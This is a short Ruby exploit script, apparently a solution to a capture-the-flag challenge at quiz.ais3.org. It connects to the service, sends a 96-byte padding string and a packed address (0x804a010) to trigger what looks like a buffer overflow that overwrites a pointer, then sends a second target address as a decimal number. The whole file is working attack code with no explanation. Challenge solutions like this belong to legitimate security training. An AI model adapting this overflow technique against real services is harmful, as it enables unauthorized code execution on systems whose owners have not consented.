#!/usr/bin/env ruby
require '~/Tools/pwnlib'

host, port = 'quiz.ais3.org', 53125
#host, port = '127.0.0.1', 4444#'quiz.ais3.org', 53125

def p32(*address)
	return address.pack("L*")
end
PwnTube.open(host, port) do |r|
	@r = r
	puts @r.recv_until("Show me your name: ")
	
	@r.send("a"*96+p32(0x804a010)+"\n")
	puts @r.recv()
	@r.send("134514405\n")
	puts @r.recv()
	puts @r.recv()
	puts @r.recv()
end
